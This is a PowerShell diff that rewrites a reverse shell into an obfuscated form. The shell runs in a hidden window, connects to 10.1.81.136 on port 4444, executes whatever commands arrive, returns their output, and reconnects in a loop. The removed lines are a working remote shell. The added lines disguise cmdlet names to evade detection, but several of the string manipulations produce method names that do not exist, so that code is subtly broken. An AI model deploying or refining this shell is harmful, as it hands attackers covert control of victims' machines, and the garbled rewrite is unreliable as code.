@@ -1,45 +1,52 @@
-Start-Process $PSHOME\powershell.exe -ArgumentList {
+$b4d7f = [char[]]@(83,116,97,114,116,45,80,114,111,99,101,115,115) -join ''
+& $b4d7f $PSHOME\powershell.exe -ArgumentList {
+  [string]$v1 = 'New-Object'
+  [string]$v2 = 'Net.Sockets.TCPClient'
+  [string]$v3 = 'GetStream'
+  [string]$v4 = 'IO.StreamWriter'
+  [string]$v5 = 'byte[]'
+  [string]$v6 = 'ReceiveBufferSize'
+  [string]$v7 = 'Write'
+  [string]$v8 = 'Flush'
+  [string]$v9 = 'Read'
+  [string]$v10 = 'text.encoding'
+  [string]$v11 = 'UTF8'
+  [string]$v12 = 'GetString'
+  [string]$v13 = 'Invoke-Expression'
+  [string]$v14 = 'Out-String'
+  [string]$v15 = 'Close'
+  [string]$v16 = 'Start-Sleep'
+  [string]$v17 = 'Seconds'
+  
   while ($true) {
     try {
-      $2104c9cc9f294cd9a6d62f9ac96968a8 = New-Object Net.Sockets.TCPClient('10.1.81.136',4444);
-      $5012fc220c634fbd9ce341a5509b0b1f = $2104c9cc9f294cd9a6d62f9ac96968a8.GetStream();
-      $03f619a9bb1340458310955381cfb40e = New-Object IO.StreamWriter($5012fc220c634fbd9ce341a5509b0b1f);
-      [byte[]]$335a4a9f0d964a3baf8f40116f8436d2 = 0..$2104c9cc9f294cd9a6d62f9ac96968a8.ReceiveBufferSize | % {0};
+      $a = & ([scriptblock]::Create($v1)) ($v2 -replace '_','')('10.1.81.136',4444)
+      $b = $a.$($v3 -creplace '[a-z]','')()
+      $c = & ([scriptblock]::Create($v1)) ($v4 -join '')($b)
+      [byte[]]$d = 0..$a.$($v6 -replace 'BufferSize','') | % {0}
 
-      function caa9a36ef94042bea67f2c18685b82da ($d4e7b81fca1d472bb7f65df282ae57f9) {
-        $03f619a9bb1340458310955381cfb40e.Write($d4e7b81fca1d472bb7f65df282ae57f9);
-        $03f619a9bb1340458310955381cfb40e.Flush()
+      function f ($e) {
+        $c.$($v7 -replace '^W','')($e)
+        $c.$($v8 -replace '^F','')()
       }
 
-      caa9a36ef94042bea67f2c18685b82da '';
+      f ('')
 
-      while (($5e7dba5250af41e88a97a5d1347e4537 = $5012fc220c634fbd9ce341a5509b0b1f.Read($335a4a9f0d964a3baf8f40116f8436d2, 0, $335a4a9f0d964a3baf8f40116f8436d2.Length)) -gt 0) {
-        $ac11601f08cd45bf9eb83dd8cbed3ac1 = ([text.encoding]::UTF8).GetString($335a4a9f0d964a3baf8f40116f8436d2, 0, $5e7dba5250af41e88a97a5d1347e4537 - 1);
-        $7f7c76cae2bf4602a557875fbea186ac = try {
-          Invoke-Expression $ac11601f08cd45bf9eb83dd8cbed3ac1 2>&1 | Out-String
+      while (($g = $b.$($v9 -replace '^R','')($d, 0, $d.Length)) -gt 0) {
+        $h = ([text.encoding]::UTF8).$($v12 -replace 'Get','')($d, 0, $g - 1)
+        $i = try {
+          & ([scriptblock]::Create($v13)) $h 2>&1 | & ([scriptblock]::Create($v14))
         } catch {
-          $_ | Out-String
+          $_ | & ([scriptblock]::Create($v14))
         }
-        caa9a36ef94042bea67f2c18685b82da ($7f7c76cae2bf4602a557875fbea186ac)
+        f ($i)
       }
 
-      $03f619a9bb1340458310955381cfb40e.Close()
-      $2104c9cc9f294cd9a6d62f9ac96968a8.Close()
+      $c.$($v15 -replace '^C','')()
+      $a.$($v15 -replace '^C','')()
     }
     catch {
-      # Connection failed or dropped, wait 10 seconds before retrying
-      Start-Sleep -Seconds 10
+      $v16 -split '-' | % { if ($_ -eq 'Sleep') { & $_ -$v17 10 } }
     }
   }
 } -WindowStyle Hidden
-
-
-
-
-
-
-
-
-
-
-
